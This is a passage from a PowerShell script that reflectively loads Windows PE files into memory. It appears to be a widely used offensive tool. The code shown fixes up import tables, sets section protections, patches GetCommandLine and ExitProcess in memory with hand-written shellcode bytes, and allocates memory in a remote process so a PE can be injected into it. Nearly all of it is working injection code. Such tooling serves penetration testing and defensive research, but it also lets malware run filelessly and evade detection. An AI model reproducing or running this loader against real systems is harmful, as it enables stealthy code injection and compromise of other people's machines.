                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
